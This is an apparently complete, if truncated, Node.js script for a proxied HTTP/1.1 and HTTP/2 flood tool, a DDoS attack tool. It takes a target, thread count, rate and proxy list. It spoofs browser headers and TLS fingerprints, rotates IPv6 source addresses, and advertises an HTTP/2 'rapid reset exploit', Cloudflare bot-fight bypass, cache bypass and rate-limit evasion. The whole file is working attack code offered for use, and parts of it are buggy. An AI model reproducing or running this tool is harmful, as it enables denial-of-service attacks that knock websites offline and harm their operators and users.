const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const { setsockopt } = require('sockopt')
const chalk = require('chalk');

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}



const SettingHeaderTableSize = 0x1;
const SettingEnablePush = 0x2;
const SettingInitialWindowSize = 0x4;
const SettingMaxHeaderListSize = 0x6;
let isFull = process.argv.includes('--full');
let shouldCloseSession = process.argv.includes('--ignore');
let custom_update = 15663105;
const blockedDomain = [".gov", ".edu"];
let STREAMID_RESET = 0;
let SO_SNDBUF = 7
let SO_RCVBUF = 8
let TCP_NODELAY = 1
let SOL_SOCKET = 1
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const rapid1 = process.argv.indexOf('--rapid');
const rapid = rapid1 !== -1 && rapid1 + 1 < process.argv.length ? process.argv[rapid1 + 1] : undefined;
const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const randua = process.argv.indexOf('--randua');
const randua1 = randua !== -1 && randua + 1 < process.argv.length ? process.argv[randua + 1] : undefined;
const fin = process.argv.indexOf('--fingerprint');
const fingerprint = fin !== -1 && fin + 1 < process.argv.length ? process.argv[fin + 1] : undefined;
const randp = process.argv.indexOf('--randpath');
const randpath = randp !== -1 && randp + 1 < process.argv.length ? process.argv[randp + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const fully = process.argv.indexOf('--full');
const fullHeaders = fully !== -1 && fully + 1 < process.argv.length ? process.argv[fully + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const connect = process.argv.indexOf('--connect');
const connections = connect !== -1 && connect + 1 < process.argv.length ? process.argv[connect + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const checking = process.argv.indexOf('--check');
const check = checking !== -1 && checking + 1 < process.argv.length ? process.argv[checking + 1] : undefined;
const caching = process.argv.indexOf('--cache');
const cache = caching !== -1 && caching + 1 < process.argv.length ? process.argv[caching + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;


if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(chalk.red.underline('Usage:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate true --rapid true --limit true\n`);
    
    console.error((`
    Options:
      --full true/false - using full headers for attack
      --connect 1-10000 - set the limit of proxy connection 
      --limit true/null - to bypass a little bit ratelimit site Example: --limit true
      --rapid true/null - rapidreset exploit Example: --rapid true
      --fingerprint true/null - enable using fingerprint Example: --fingerprint true
      --randua true/null - to using random useragent Mozilla  (default useragent type : Browser ) Example: --randua true
      --randpath true/null - using random path attack
      --delay <1-100> - delay between requests 1-100 ms (optimal) default 1 ms
      --bfm true/null - enable bypass bot fight mode
      --check true/null - enable auto end bad proxies
      --cache true/null - enable bypass cache
      --referer https://target.com / rand - use custom referer if you need and rand - if you need to generate domains ex: fwfwwfwfw.net
      --postdata "username=admin&password=123" - if you need data to post, req method format "username=f&password=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --http 1/2/mix - new function choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
    `));
    process.exit(1);
}
const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
var randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 



if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked`);
    process.exit(1);
}
function random_string(length) {
const characters = 'abcdefghijklmnopqrstuvwxyz';
let result = "";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result
}
function random_int(minimum, maximum) {
return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}
let hcookie = "";       
function random_cookies() {
let cookies = "";
const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
const cookie_limit = random_int(1, cookie_names.length);
for (var x = 0; x < cookie_limit; x++) {
const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
const cookie_index = cookie_names.indexOf(cookie_name);
if (cookie_index > -1) {
cookie_names.splice(cookie_index, 1);
}
const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
cookies += `${cookie_name}=${cookie_value}`;
if (x+1 < cookie_limit) {
cookies += '; ';
}
}
}


if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
  const hcookie = random_cookies();
}
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}
function getLocalIPv6() {
    const interfaces = os.networkInterfaces();
    let ipv6Address = null;

    for (const ifaceName of Object.keys(interfaces)) {
        const iface = interfaces[ifaceName];
        const ipv6 = iface.find((details) => details.family === 'IPv6' && !details.internal);

        if (ipv6) {
            ipv6Address = ipv6.address.split('%')[0];
            ipv6Address = ipv6Address.replace('::2', '');
            ipv6Address = ipv6Address.replace('::1', '');
            break;
        }
    }

    return ipv6Address;
}

const ipv6 = getLocalIPv6();
const array = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f'];
function rnd_ip_block() {
    const a = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const b = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const c = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const d = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];

    return `${ipv6}:${a}:${b}:${c}:${d}`;
}
function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);

    return Buffer.concat([frameHeader, statusCode]);
}
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}
function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(128, 130);
        var brandValue, versionList, fullVersion;
        switch (browserVersion) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                break;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
                    }
                    const isBrave = versionList.includes('Brave');

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';


    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7';

        const generateUserAgent = () => {
                        const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
                        const browsers = [
                        { name: "Chrome", versions: ["91.0", "92.0", "93.0", "94.0", "95.0"] },
                        { name: "Firefox", versions: ["89.0", "90.0", "91.0", "92.0"] },
                        { name: "Safari", versions: ["14.1", "15.0", "15.1", "16.0"] },
                        { name: "Edge", versions: ["91.0", "92.0", "93.0"] },
                        { name: "Opera", versions: ["78.0", "79.0", "80.0"] },
                        { name: "Internet Explorer", versions: ["11.0", "10.0"] }
                        ];
                        
                        const devices = [
                        { name: "Pixel 6", platform: "Android", version: "12" },
                        { name: "iPhone 13", platform: "iOS", version: "15" },
                        { name: "Samsung Galaxy S21", platform: "Android", version: "11" },
                        { name: "MacBook Pro", platform: "macOS", version: "Monterey" },
                        { name: "Windows 10 PC", platform: "Windows", version: "10" },
                        ];
                        
                        const engines = [
                        { name: "Blink", versions: ["91", "92", "93"] },
                        { name: "Gecko", versions: ["89", "90", "91"] },
                        { name: "WebKit", versions: ["604", "605", "606"] },
                        ];
                        
                        const osList = [
                        "Linux", "Windows 10", "macOS Monterey", "iOS 15", "Android 12", "Ubuntu 20.04", "Fedora 34"
                        ];
                        
                        
                        const features = [
                        { name: "WebGL", version: "1.0" },
                        { name: "Service Worker", version: "1.0" },
                        { name: "ES6", version: "2015" },
                        { name: "Canvas", version: "2.0" },
                        
                        ];
                        const browser = getRandomItem(browsers);
                        const device = getRandomItem(devices);
                        const engine = getRandomItem(engines);
                        const os = getRandomItem(osList);
                        const feature = getRandomItem(features);
                        return `${browser.name}/${getRandomItem(browser.versions)} ` +`(${device.name}; ${device.platform} ${device.version}; ${os}) ` +`${engine.name}/${getRandomItem(engine.versions)} ` +`(KHTML, like Gecko) ${feature.name}/${feature.version}`;
                        };
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }
    const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: no-store, no-cache, must-revalidate\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Pragma: no-cache\r\n' +                                    // Force cache bypass
        'Expires: 0\r\n' +                                        // Force revalidation
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${generateUserAgent()}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
        
        
        if (Math.random() < 0.5) {
        headers += `Sec-Fetch-Mode: ${randomString}\r\n`;
        headers += `Sec-Fetch-Site: none\r\n`;
        headers += `Sec-Fetch-User: ${randomString}\r\n`;
        headers += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
        headers += `Origin: https://${randomString}${url.hostname}\r\n`;
        headers += '\r\n';
    } else {
        headers += 'Sec-Fetch-Mode: navigate\r\n';
        headers += `Sec-Fetch-Site: ${randomString}\r\n`;
        headers += `Sec-Fetch-User: ?1\r\n`;
        headers += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
        headers += `Origin: https://${randomString}${url.hostname}\r\n`;
        headers += '\r\n';
    }
        
    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
        setsockopt(netSocket, 6, 3, 1)
        setsockopt(netSocket, 6, TCP_NODELAY, 1)
        setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
        setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000)
        let ip_address = rnd_ip_block();
        
        const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");
        const curves = [
    "X25519",
    "P-256",
    "P-384"
].join(":");
        const ver = ["TLSv1.3","TLSv1.2"]
        const ssl_versions = ['771', '772', '773']; 
const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];
function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}
const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
];

const encodings = [
    "gzip, deflate, br, zstd",
    "gzip, deflate, br"
]
const ciphers = [
    "TLS_GREASE",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
].join(":");
let status_codes = {}
const timeout = (duration) => {
        setTimeout(() => {
            go(proxyHost, proxyPort);
        }, duration);
    }
            tlsSocket = tls.connect({
                socket: netSocket,
                localAddress: ip_address,
                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
                requestOCSP: Math.random() < 0.50 ? true : false,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                 ciphers: ciphers,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                minVersion: ver[ver.length - 1],
                maxVersion: ver[0],
                rejectUnauthorized: false,
                ...(fingerprint === true ? { fingerprint: random_fingerprint() } : {}),
            }, () => {
            
                tlsSocket.addListener("ratelimit", async (duration) => {
                    const proxyKey = `${proxyHost}:${proxyPort}`;
                    const index = proxy.indexOf(proxyKey);
                    if (index > -1) proxy.splice(index, 1);
                    tlsSocket.end(() => tlsSocket.destroy());
                    await timeout(duration * 1000);
                });
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }
                    

                    function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    main()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }
                let g = 0;
                setInterval(() => {
                g = 0;
                }, 10000);
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);
                let getgoaway;;
                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                 if (getgoaway >= 1000 && g == 0) {
                    SettingHeaderTableSize += 1;
                    g = 1;
                }

                const frames1= [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [SettingHeaderTableSize, 65536],
                        [SettingEnablePush, 0],
                        [SettingInitialWindowSize, 6291456],
                        [SettingMaxHeaderListSize, 262144],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);
                
                


                
                

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])
                    
                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }

                            if (frame.type == 1) {
                                const decodedHeaders = hpack.decode(frame.payload);
                                if (!decodedHeaders || !Array.isArray(decodedHeaders)) {
                                return; 
                                }
                                
                                const statusHeader = decodedHeaders.find(x => x[0] === ':status');
                                const retryAfterHeader = decodedHeaders.find(x => x[0] === 'retry-after');
                                const cfMitigatedHeader = decodedHeaders.find(x => x[0] === 'cf-mitigated');
                                
                                const status = statusHeader ? statusHeader[1] : undefined;
                                const retryAfter = retryAfterHeader ? retryAfterHeader[1] : undefined;
                                const cfMitigated = cfMitigatedHeader ? cfMitigatedHeader[1] : undefined;
                                
                                
                                
                                if (status === 302 || status === 301) {
                                const redirect = hpack.decode(frame.payload).find(x => x[0] == 'location')[1];
                                url = new URL(redirect, url.href);
                                }
                                 else if ((status === "403" || status === "429") && limit && retryAfter) {
                                    tlsSocket.emit("ratelimit", parseInt(retryAfter));
                                    if (!status['BLOCK']) status['BLOCK'] = 0;
                                    status['BLOCK']++;
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return;
                                }
                                if (cfMitigatedHeader && cfMitigatedHeader[1] === 'challenge') {
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return;
                                }
                                if (['403', '400', '429'].includes(status) && check) {
                                tlsSocket.end(() => tlsSocket.destroy());
                                }

                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            } else if (frame.type === 3) {
                                if (!statuses["RST"]) statuses["RST"] = 0;
                                statuses["RST"]++;
                                tlsSocket.end(() => tlsSocket.destroy());
                            } else if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 0x4, "", 0x1));
                            }  else if (frame.type === 5) {
                                // push promise
                                continue;
                            } else if (frame.type === 6) {
                                if (!(frame.flags & 0x1)) {
                                    tlsSocket.write(encodeFrame(0, 0x6, frame.payload, 0x1));
                                }
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                        getgoaway += 1;
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames1))
                function main() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    const customHeadersArray = [];

                      if (customHeaders) {
    const customHeadersList = customHeaders.split('#');
    for (const header of customHeadersList) {
        const [name, value] = header.split(':').map(part => part?.trim());
        if (name && value) {
            customHeadersArray.push({ [name.toLowerCase()]: value });
        } else {
            console.warn(`Invalid header format for: ${header}`);
        }
    }
}


                       function rate_range(base) {
                       const rate_eq = (base * 50) / 100;
                       const min_range = base - rate_eq;
                       const max_range = base + rate_eq;
                       return {
                       min: Math.max(0, min_range),
                       max_range
                       };
                       }
                       const calculateRate = () => {
                       let rate;
                       if (randrate === "") {
                       rate = ratelimit;
                       } else if (randrate.includes('-')) {
                       let rate_parts = randrate.split('-');
                       let minimum, maximum;
                       
                       if (rate_parts.length === 2) {
                       try {
                       minimum = parseInt(rate_parts[0]);
                       maximum = parseInt(rate_parts[1]);
                       
                       if (minimum > maximum) {
                       rate = getRandomInt(maximum, minimum);
                       } else {
                       rate = getRandomInt(minimum, maximum);
                       }
                       } catch (err) {
                       rate = getRandomInt(1, 90);
                       }
                       }
